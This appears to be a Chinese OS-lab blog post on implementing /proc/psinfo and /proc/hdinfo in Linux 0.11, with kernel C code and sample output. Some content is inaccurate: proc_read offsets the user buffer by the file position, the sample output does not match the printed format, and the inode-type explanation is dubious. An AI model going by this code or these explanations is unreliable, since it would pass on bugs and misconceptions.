<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /proc/psinfo</span></span><br><span class="line"> pid    state    father    counter    start_time</span><br><span class="line"> 0    	1    	-1    		0     	  0</span><br><span class="line"> 1    	1    	 0    		28        1</span><br><span class="line"> 4    	1    	 1    		1    	  73</span><br><span class="line"> 3    	1    	 1    		27        63</span><br><span class="line"> 6    	0   	 4    		12        817</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /proc/hdinfo</span> </span><br><span class="line">total_blocks:    62000;</span><br><span class="line">free_blocks:     39037;</span><br><span class="line">used_blocks:     22963;</span><br></pre></td></tr></table></figure>
<p><strong>实验过程</strong></p>
<p>procfs 是一个 Linux 内核模块，它提供了一个用于访问进程信息的文件系统</p>
<ul>
<li>通过 procfs，你可以查看与进程有关的信息，如进程 ID、进程名、进程的命令行参数等</li>
<li>它使得用户可以方便地对进程进行管理和监控</li>
</ul>
<p>procfs 的实现依赖于内核的 proc 文件系统，它将进程信息存储在 <code>/proc</code> 目录下</p>
<ul>
<li>这个目录提供了一组用于访问进程信息的文件和目录</li>
<li>通过这些文件，你可以查看进程的详细信息，如 <code>/proc/[pid]/cmdline</code> 文件可以查看进程的命令行参数</li>
</ul>
<p>在开始实验前，我们需要先了解 linux 中的两个关键结构 file 和 inode</p>
<p>在 Linux 中，结构体 file 用于描述一个内存中的文件（打开的文件）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> f_mode;		<span class="comment">/* 文件权限 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> f_flags;		<span class="comment">/* 文件标志 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> f_count;		<span class="comment">/* 文件计数器 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">f_inode</span>;</span>	<span class="comment">/* 对应inode结构体 */</span></span><br><span class="line">	<span class="keyword">off_t</span> f_pos;			   <span class="comment">/* 表示文件当前位置 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每种类型的文件都有一个唯一的标识符，即索引节点 inode，结构体 inode 用于描述一个在磁盘中的文件或者一个有特定功能的虚拟文件</p>
<p>索引节点有两种类型：</p>
<ul>
<li>metadata inode 是用于存储文件元数据的 inode<ul>
<li>元数据(metadata)：用来描述一个文件的特征，包含了该文件或目录的元数据，如权限、所有者、组、大小、创建时间等</li>
</ul>
</li>
<li>data inode 是用于存储文件数据的 inode<ul>
<li>数据(data)：泛指普通文件中的实际数据</li>
</ul>
</li>
</ul>
<p>在 linux-0.11 中似乎没有刻意去区别这两种类型的 inode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">d_inode</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_mode;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_uid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i_time;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_gid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_nlinks;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_zone[<span class="number">9</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_mode;		<span class="comment">/* 文件权限 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_uid;		<span class="comment">/* 文件所有者 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i_size;		<span class="comment">/* 文件大小 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i_mtime;		<span class="comment">/* 最后修改的时间 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_gid;		<span class="comment">/* 文件组 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_nlinks;		<span class="comment">/* 文件链接数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_zone[<span class="number">9</span>];	<span class="comment">/* 文件磁盘区域 */</span></span><br><span class="line"><span class="comment">/* these are in memory also */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">i_wait</span>;</span> <span class="comment">/* 对应任务 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i_atime;		<span class="comment">/* 访问时间 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i_ctime;		<span class="comment">/* 修改时间 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_dev;		<span class="comment">/* 设备号 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_num;		<span class="comment">/* 文件编号 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> i_count;		<span class="comment">/* 计数器 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_lock;		<span class="comment">/* 锁标记 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_dirt;		<span class="comment">/* 脏标记 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_pipe;		<span class="comment">/* 管道标记 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_mount;		<span class="comment">/* 挂载标记 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_seek;		<span class="comment">/* 在文件读取时使用的缓冲区大小 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i_update;		<span class="comment">/* 在更新文件时使用的缓冲区大小 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>首先 proc 文件系统中包含一种特殊类型的文件，需要在 <code>include/sys/stat.h</code> 中进行定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFMT  00170000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFREG  0100000		<span class="comment">/* 普通文件 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFBLK  0060000		<span class="comment">/* 块设备 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFDIR  0040000		<span class="comment">/* 目录 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFCHR  0020000		<span class="comment">/* 字符设备 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFIFO  0010000		<span class="comment">/* 管道 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISREG(m)	(((m) &amp; S_IFMT) == S_IFREG)		<span class="comment">/* 是否为普通文件 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISDIR(m)	(((m) &amp; S_IFMT) == S_IFDIR)		<span class="comment">/* 是否为目录 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISCHR(m)	(((m) &amp; S_IFMT) == S_IFCHR)		<span class="comment">/* 是否为字符设备 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISBLK(m)	(((m) &amp; S_IFMT) == S_IFBLK)		<span class="comment">/* 是否为块设备 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISFIFO(m)	(((m) &amp; S_IFMT) == S_IFIFO)		<span class="comment">/* 是否为管道 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_IFPROC 0030000		<span class="comment">/* proc文件 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S_ISPROC(m) (((m) &amp; S_IFMT) ==  S_IFPROC) 	<span class="comment">/* 是否为proc文件 */</span></span></span><br></pre></td></tr></table></figure>
<p>接下来我们需要在 <code>sys_mknod sys_read</code> 中添加有关 proc 文件的判断，使其可以支持 proc 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_mknod</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">int</span> mode, <span class="keyword">int</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line">	<span class="keyword">int</span> namelen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">dir</span>, * <span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span>	<span class="comment">/* 用于描述一块磁盘块缓冲区 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span>		<span class="comment">/* 用于描述一个目录项 */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!suser())</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">	<span class="keyword">if</span> (!(dir = dir_namei(filename,&amp;namelen,&amp;basename))) <span class="comment">/* 获取上层目录的inode */</span></span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (!namelen) &#123;</span><br><span class="line">		iput(dir); <span class="comment">/* 将一个inode从当前目录中移除 */</span></span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!permission(dir,MAY_WRITE)) &#123; <span class="comment">/* 检查目录的权限 */</span></span><br><span class="line">		iput(dir);</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">	&#125;</span><br><span class="line">	bh = find_entry(&amp;dir,basename,namelen,&amp;de); <span class="comment">/* 在目录中查找一个文件 */</span></span><br><span class="line">	<span class="keyword">if</span> (bh) &#123; <span class="comment">/* 文件名重复 */</span></span><br><span class="line">		brelse(bh);</span><br><span class="line">		iput(dir);</span><br><span class="line">		<span class="keyword">return</span> -EEXIST;</span><br><span class="line">	&#125;</span><br><span class="line">	inode = new_inode(dir-&gt;i_dev); <span class="comment">/* 分配一个新的index结构体 */</span></span><br><span class="line">	<span class="keyword">if</span> (!inode) &#123;</span><br><span class="line">		iput(dir);</span><br><span class="line">		<span class="keyword">return</span> -ENOSPC;</span><br><span class="line">	&#125;</span><br><span class="line">	inode-&gt;i_mode = mode;</span><br><span class="line">	<span class="keyword">if</span>(S_ISBLK(mode) || S_ISCHR(mode) || S_ISPROC(mode))</span><br><span class="line">		inode-&gt;i_zone[<span class="number">0</span>] = dev;</span><br><span class="line">	inode-&gt;i_mtime = inode-&gt;i_atime = CURRENT_TIME;</span><br><span class="line">	inode-&gt;i_dirt = <span class="number">1</span>;</span><br><span class="line">	bh = add_entry(dir,basename,namelen,&amp;de); <span class="comment">/* 添加一个新目录项 */</span></span><br><span class="line">	<span class="keyword">if</span> (!bh) &#123;</span><br><span class="line">		iput(dir);</span><br><span class="line">		inode-&gt;i_nlinks=<span class="number">0</span>;</span><br><span class="line">		iput(inode);</span><br><span class="line">		<span class="keyword">return</span> -ENOSPC;</span><br><span class="line">	&#125;</span><br><span class="line">	de-&gt;inode = inode-&gt;i_num;</span><br><span class="line">	bh-&gt;b_dirt = <span class="number">1</span>;</span><br><span class="line">	iput(dir);</span><br><span class="line">	iput(inode);</span><br><span class="line">	brelse(bh);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd&gt;=NR_OPEN || count&lt;<span class="number">0</span> || !(file=current-&gt;filp[fd]))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (!count)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	verify_area(buf,count);</span><br><span class="line">	inode = file-&gt;f_inode;</span><br><span class="line">	<span class="keyword">if</span> (inode-&gt;i_pipe) <span class="comment">/* 处理管道 */</span></span><br><span class="line">		<span class="keyword">return</span> (file-&gt;f_mode&amp;<span class="number">1</span>)?read_pipe(inode,buf,count):-EIO;</span><br><span class="line">	<span class="keyword">if</span> (S_ISPROC(inode-&gt;i_mode)) <span class="comment">/* 处理proc文件 */</span></span><br><span class="line">		<span class="keyword">return</span> proc_read(inode-&gt;i_zone[<span class="number">0</span>],&amp;file-&gt;f_pos,buf,count);</span><br><span class="line">	<span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode)) <span class="comment">/* 处理字符设备 */</span></span><br><span class="line">		<span class="keyword">return</span> rw_char(READ,inode-&gt;i_zone[<span class="number">0</span>],buf,count,&amp;file-&gt;f_pos);</span><br><span class="line">	<span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode)) <span class="comment">/* 处理块设备 */</span></span><br><span class="line">		<span class="keyword">return</span> block_read(inode-&gt;i_zone[<span class="number">0</span>],&amp;file-&gt;f_pos,buf,count);</span><br><span class="line">	<span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode) || S_ISREG(inode-&gt;i_mode)) &#123; <span class="comment">/* 处理目录和普通文件 */</span></span><br><span class="line">		<span class="keyword">if</span> (count+file-&gt;f_pos &gt; inode-&gt;i_size)</span><br><span class="line">			count = inode-&gt;i_size - file-&gt;f_pos;</span><br><span class="line">		<span class="keyword">if</span> (count&lt;=<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> file_read(inode,file,buf,count);</span><br><span class="line">	&#125;</span><br><span class="line">	printk(<span class="string">&quot;(Read)inode-&gt;i_mode=%06o\n\r&quot;</span>,inode-&gt;i_mode);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们需要在根文件系统加载后创建 <code>/proc</code> 目录以及其中的 <code>psinfo hdinfo</code> 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info); <span class="comment">/* 挂载根文件系统 */</span></span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>); <span class="comment">/* 创建stdin */</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>); <span class="comment">/* 创建stdout */</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>); <span class="comment">/* 创建stderr */</span></span><br><span class="line">mkdir(<span class="string">&quot;/proc&quot;</span>,<span class="number">0755</span>);</span><br><span class="line">mknod(<span class="string">&quot;/proc/psinfo&quot;</span>,S_IFPROC|<span class="number">0444</span>,<span class="number">0</span>);</span><br><span class="line">mknod(<span class="string">&quot;/proc/hdinfo&quot;</span>,S_IFPROC|<span class="number">0444</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d buffers = %d bytes buffer space\n\r&quot;</span>,NR_BUFFERS,</span><br><span class="line">	NR_BUFFERS*BLOCK_SIZE);</span><br></pre></td></tr></table></figure>
<p>最后的实验操作就是实现 <code>proc_read</code> 函数（新建 <code>fs/proc.c</code> 文件）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_bit(bitnr, addr) (&#123; \</span></span><br><span class="line"><span class="meta">register int __res ; \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;bt %2,%3;setb %%al&quot;</span>:<span class="meta-string">&quot;=a&quot;</span> (__res):<span class="meta-string">&quot;a&quot;</span> (0),<span class="meta-string">&quot;r&quot;</span> (bitnr),<span class="meta-string">&quot;m&quot;</span> (*(addr))); \</span></span><br><span class="line"><span class="meta">__res; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> proc_buf[<span class="number">4096</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list args)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span>&#123;</span><br><span class="line">	va_list args;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	va_start(args, fmt);</span><br><span class="line">	i = <span class="built_in">vsprintf</span>(buf, fmt, args);</span><br><span class="line">	va_end(args);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_psinfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> read = <span class="number">0</span>;</span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;pid\tstate\tfather\tcounter\tstart_time\n&quot;</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> **<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">for</span> (p = &amp;FIRST_TASK; p &lt;= &amp;LAST_TASK; ++p) <span class="comment">/* 遍历task[NR_TASKS] */</span></span><br><span class="line">		<span class="keyword">if</span> (*p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">			read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;%d\t&quot;</span>, (*p)-&gt;pid);</span><br><span class="line">			read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;%d\t&quot;</span>, (*p)-&gt;state);</span><br><span class="line">			read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;%d\t&quot;</span>, (*p)-&gt;father);</span><br><span class="line">			read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;%d\t&quot;</span>, (*p)-&gt;counter);</span><br><span class="line">			read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;%d\n&quot;</span>, (*p)-&gt;start_time);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_hdinfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> read = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i, used;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line">	sb = get_super(<span class="number">0x301</span>); <span class="comment">/* 磁盘设备号:3*256+1 */</span></span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;Total blocks:%d\n&quot;</span>, sb-&gt;s_nzones);</span><br><span class="line">	used = <span class="number">0</span>;</span><br><span class="line">	i = sb-&gt;s_nzones;</span><br><span class="line">	<span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> (set_bit(i &amp; <span class="number">8191</span>, sb-&gt;s_zmap[i &gt;&gt; <span class="number">13</span>]-&gt;b_data))</span><br><span class="line">			used++;</span><br><span class="line">	&#125;</span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;Used blocks:%d\n&quot;</span>, used);</span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;Free blocks:%d\n&quot;</span>, sb-&gt;s_nzones - used);</span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;Total inodes:%d\n&quot;</span>, sb-&gt;s_ninodes);</span><br><span class="line">	used = <span class="number">0</span>;</span><br><span class="line">	i = sb-&gt;s_ninodes + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> (set_bit(i &amp; <span class="number">8191</span>, sb-&gt;s_imap[i &gt;&gt; <span class="number">13</span>]-&gt;b_data))</span><br><span class="line">			used++;</span><br><span class="line">	&#125;</span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;Used inodes:%d\n&quot;</span>, used);</span><br><span class="line">	read += <span class="built_in">sprintf</span>(proc_buf + read, <span class="string">&quot;Free inodes:%d\n&quot;</span>, sb-&gt;s_ninodes - used);</span><br><span class="line">	<span class="keyword">return</span> read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">proc_read</span><span class="params">(<span class="keyword">int</span> dev, <span class="keyword">unsigned</span> <span class="keyword">long</span> *pos, <span class="keyword">char</span> *buf, <span class="keyword">int</span> count)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">if</span> (*pos % <span class="number">1024</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> (dev == <span class="number">0</span>)</span><br><span class="line">			get_psinfo();</span><br><span class="line">		<span class="keyword">if</span> (dev == <span class="number">1</span>)</span><br><span class="line">			get_hdinfo();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (proc_buf[i + *pos] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		put_fs_byte(proc_buf[i + *pos], buf + i + *pos);</span><br><span class="line">	&#125;</span><br><span class="line">	*pos += i;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后修改 <code>fs/makefile</code>：</p>
